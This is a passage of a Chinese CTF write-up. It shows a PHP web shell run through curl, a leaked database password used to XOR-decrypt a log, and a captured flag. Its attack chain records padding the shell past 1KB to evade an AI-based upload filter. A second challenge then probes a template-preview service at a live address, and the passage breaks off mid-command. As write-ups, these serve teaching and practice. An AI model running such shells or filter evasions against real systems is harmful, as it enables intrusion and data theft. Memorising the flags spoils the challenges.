+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl <span class="s2">&#34;http://TARGET/uploads/s.php.txt?cmd=id&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><h2 class="heading-element" id="后渗透枚举"><span>后渗透枚举</span>
+  <a href="#%e5%90%8e%e6%b8%97%e9%80%8f%e6%9e%9a%e4%b8%be" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl <span class="s2">&#34;http://TARGET/uploads/s.php.txt?cmd=find%20/var/www/html%20-maxdepth%204%20-type%20f&#34;</span></span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>发现 <code>/var/www/html/uploads/</code> 下存在隐藏目录 <code>admin/</code>：</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">/var/www/html/uploads/admin/analysis_report.pdf
+</span></span><span class="line"><span class="cl">/var/www/html/uploads/admin/db_backup.conf
+</span></span><span class="line"><span class="cl">/var/www/html/uploads/admin/upload_logs/.hash_record
+</span></span><span class="line"><span class="cl">/var/www/html/uploads/admin/upload_logs/access.log
+</span></span><span class="line"><span class="cl">/var/www/html/uploads/admin/upload_logs/access.log.backup</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><h3 class="heading-element" id="db_backupconf"><span>db_backup.conf</span>
+  <a href="#db_backupconf" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="2" style="--fi-max-shown-lines:30;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-ini" data-lang="ini"><span class="line"><span class="cl"><span class="k">[integrity]</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Log integrity verification enabled</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Original hash: d79666476d5206d9c01b7a3b8b51ed0fb78bd00eacde38e47dade6f92ca25d07</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Backup location: uploads/admin/upload_logs/access.log.backup</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Backup encryption: XOR with db_password</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Current hash verification: sha256sum uploads/admin/upload_logs/access.log</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">[database]</span>
+</span></span><span class="line"><span class="cl"><span class="na">host</span> <span class="o">=</span> <span class="s">172.16.0.50</span>
+</span></span><span class="line"><span class="cl"><span class="na">port</span> <span class="o">=</span> <span class="s">3306</span>
+</span></span><span class="line"><span class="cl"><span class="na">database</span> <span class="o">=</span> <span class="s">ai_doc_system</span>
+</span></span><span class="line"><span class="cl"><span class="na">username</span> <span class="o">=</span> <span class="s">doc_admin</span>
+</span></span><span class="line"><span class="cl"><span class="na">password</span> <span class="o">=</span> <span class="s">AIDoc#2024Secure</span></span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>关键信息：</p>
+<ul>
+<li><code>access.log.backup</code> 使用数据库密码 XOR 加密</li>
+<li>原始 SHA256 hash 用于解密后完整性校验</li>
+<li>数据库密码 <code>AIDoc#2024Secure</code> 即为 XOR 密钥</li>
+<li>内网数据库地址 <code>172.16.0.50:3306</code></li>
+</ul>
+<h3 class="heading-element" id="hash_record"><span>.hash_record</span>
+  <a href="#hash_record" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">d79666476d5206d9c01b7a3b8b51ed0fb78bd00eacde38e47dade6f92ca25d07</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>与 <code>db_backup.conf</code> 中记录的原始 hash 一致，用于交叉验证。</p>
+<h2 class="heading-element" id="解密日志备份"><span>解密日志备份</span>
+  <a href="#%e8%a7%a3%e5%af%86%e6%97%a5%e5%bf%97%e5%a4%87%e4%bb%bd" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="2" style="--fi-max-shown-lines:30;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pathlib</span> <span class="kn">import</span> <span class="n">Path</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">hashlib</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">cipher</span> <span class="o">=</span> <span class="n">Path</span><span class="p">(</span><span class="s2">&#34;access.log.backup&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">read_bytes</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">key</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;AIDoc#2024Secure&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">plain</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">b</span> <span class="o">^</span> <span class="n">key</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)]</span> <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">b</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">cipher</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 完整性校验</span>
+</span></span><span class="line"><span class="cl"><span class="k">assert</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha256</span><span class="p">(</span><span class="n">plain</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span> <span class="o">==</span> \
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;d79666476d5206d9c01b7a3b8b51ed0fb78bd00eacde38e47dade6f92ca25d07&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">plain</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span></span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>Hash 校验通过后输出解密日志（JSONL 格式）：</p>
+<json-viewer value="&#34;{\&#34;time\&#34;:\&#34;2024-10-10 15:14:51\&#34;,\&#34;ip\&#34;:\&#34;203.0.113.88\&#34;,\&#34;action\&#34;:\&#34;shell_exec\&#34;,\&#34;command\&#34;:\&#34;cat /opt/secrets/operation_darknet.txt\&#34;,\&#34;log_id\&#34;:\&#34;LOG-20241010-88239\&#34;,\&#34;severity\&#34;:\&#34;critical\&#34;}\r\n{\&#34;time\&#34;:\&#34;2024-10-10 15:15:22\&#34;,\&#34;ip\&#34;:\&#34;203.0.113.88\&#34;,\&#34;action\&#34;:\&#34;file_steal\&#34;,\&#34;file\&#34;:\&#34;operation_darknet.txt\&#34;,\&#34;size\&#34;:4521,\&#34;log_id\&#34;:\&#34;LOG-20241010-88240\&#34;,\&#34;severity\&#34;:\&#34;critical\&#34;}&#34;" expand-depth="1" boxed copyable="{&#34;copiedText&#34;:&#34;Copied&#34;,&#34;copyText&#34;:&#34;Copy&#34;}"></json-viewer><p>日志记录攻击者两次操作：</p>
+<ol>
+<li><code>LOG-20241010-88239</code> — 执行 <code>cat /opt/secrets/operation_darknet.txt</code> 读取机密文件（<code>shell_exec</code>）</li>
+<li><code>LOG-20241010-88240</code> — 将文件外传（<code>file_steal</code>），大小 4521 字节</li>
+</ol>
+<h2 class="heading-element" id="证据提取"><span>证据提取</span>
+  <a href="#%e8%af%81%e6%8d%ae%e6%8f%90%e5%8f%96" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><div class="table-wrapper">
+  <table>
+    <thead>
+        <tr>
+            <th>字段</th>
+            <th>值</th>
+            <th>提取来源</th>
+        </tr>
+    </thead>
+    <tbody>
+        <tr>
+            <td>Attacker IP</td>
+            <td><code>203.0.113.88</code></td>
+            <td>日志 <code>ip</code> 字段</td>
+        </tr>
+        <tr>
+            <td>Key Log ID</td>
+            <td><code>LOG-20241010-88239</code></td>
+            <td>shell_exec 执行窃取命令的日志 ID</td>
+        </tr>
+        <tr>
+            <td>Confidential File</td>
+            <td><code>operation_darknet.txt</code></td>
+            <td>日志 <code>file</code> 字段 + <code>command</code> 路径</td>
+        </tr>
+    </tbody>
+  </table>
+</div><blockquote>
+<p>submit.php 仅验证一个 Key Log ID。两条日志中 <code>LOG-20241010-88239</code>（实际执行 shell 命令窃取文件的记录）通过验证。</p>
+</blockquote>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">flag{1jsm8ue6sfmin21udk4j7jq5tgs5iibl}</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><h2 class="heading-element" id="攻击链"><span>攻击链</span>
+  <a href="#%e6%94%bb%e5%87%bb%e9%93%be" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">端点枚举(7个) → 上传测试确认3层防护 → 源码审计发现 .htaccess 白名单 + AI 1KB限制
+</span></span><span class="line"><span class="cl">    → upload .htaccess (AddType .txt→PHP)
+</span></span><span class="line"><span class="cl">    → upload padded shell (1025B &#39;#&#39; bypass AI) → RCE (www-data)
+</span></span><span class="line"><span class="cl">    → find 枚举 /uploads/admin/ 隐藏目录
+</span></span><span class="line"><span class="cl">    → db_backup.conf 泄露 XOR 密钥 AIDoc#2024Secure + SHA256 预期值
+</span></span><span class="line"><span class="cl">    → XOR 解密 access.log.backup + hash 完整性校验
+</span></span><span class="line"><span class="cl">    → 提取 203.0.113.88 / LOG-20241010-88239 / operation_darknet.txt
+</span></span><span class="line"><span class="cl">    → submit.php → flag</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><h1 class="heading-element" id="prompt-vault"><span>Prompt Vault</span>
+  <a href="#prompt-vault" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h1><p>这一题是晚上六点新发的，直接被队友秒掉了，看看队友的 WP</p>
+<p><strong>題目描述</strong></p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">Preview customer reply templates and find the dynamic flag hidden in an internal snippet.
+</span></span><span class="line"><span class="cl">預覽客服回覆模板，找出隱藏於內部片段中的動態 flag。
+</span></span><span class="line"><span class="cl">预览客服回复模板，找出隐藏在内部片段中的动态 flag。</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><h2 class="heading-element" id="题目信息"><span>题目信息</span>
+  <a href="#%e9%a2%98%e7%9b%ae%e4%bf%a1%e6%81%af" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>服务地址：</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">http://36.213.142.162:27379</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>题目提示：</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">预览客服回复模板，找出隐藏在内部片段中的动态 flag。</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>从描述可以判断，目标是一个客服回复模板预览系统，flag 不在普通页面源码中，而是藏在某个内部模板片段里。核心思路是先找到内部片段名称，再通过预览功能渲染它。</p>
+<h2 class="heading-element" id="页面分析"><span>页面分析</span>
+  <a href="#%e9%a1%b5%e9%9d%a2%e5%88%86%e6%9e%90" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>访问首页：</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -s http://36.213.142.162:27379/</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>页面标题为 <code>ReplyKit</code>，是一个回复草稿预览工具。前端 JavaScript 中可以看到两个接口：</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">GET  /api/promptlets
+</span></span><span class="line"><span class="cl">POST /api/preview</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>其中 <code>/api/promptlets</code> 用来获取可选的模板片段，<code>/api/preview</code> 用来渲染用户提交的草稿。</p>
+<p>前端插入模板片段时使用的语法如下：</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">{{ include_prompt(&#34;name&#34;) }}</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>这说明只要知道片段名，就可以手动构造模板语法并提交给预览接口。</p>
+<h2 class="heading-element" id="枚举公开片段"><span>枚举公开片段</span>
+  <a href="#%e6%9e%9a%e4%b8%be%e5%85%ac%e5%bc%80%e7%89%87%e6%ae%b5" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>请求公开片段列表：</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -s http://36.213.142.162:27379/api/promptlets</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>返回：</p>
+<json-viewer value="&#34;{\r\n  \&#34;promptlets\&#34;: [\r\n    \&#34;greeting\&#34;,\r\n    \&#34;help\&#34;,\r\n    \&#34;terms\&#34;,\r\n    \&#34;contact\&#34;\r\n  ],\r\n  \&#34;success\&#34;: true\r\n}&#34;" expand-depth="1" boxed copyable="{&#34;copiedText&#34;:&#34;Copied&#34;,&#34;copyText&#34;:&#34;Copy&#34;}"></json-viewer><p>公开片段只有四个：</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">greeting
+</span></span><span class="line"><span class="cl">help
+</span></span><span class="line"><span class="cl">terms
+</span></span><span class="line"><span class="cl">contact</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>尝试渲染公开片段：</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -s -X POST http://36.213.142.162:27379/api/preview <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -H <span class="s1">&#39;Content-Type: application/json&#39;</span> <span class="se">\
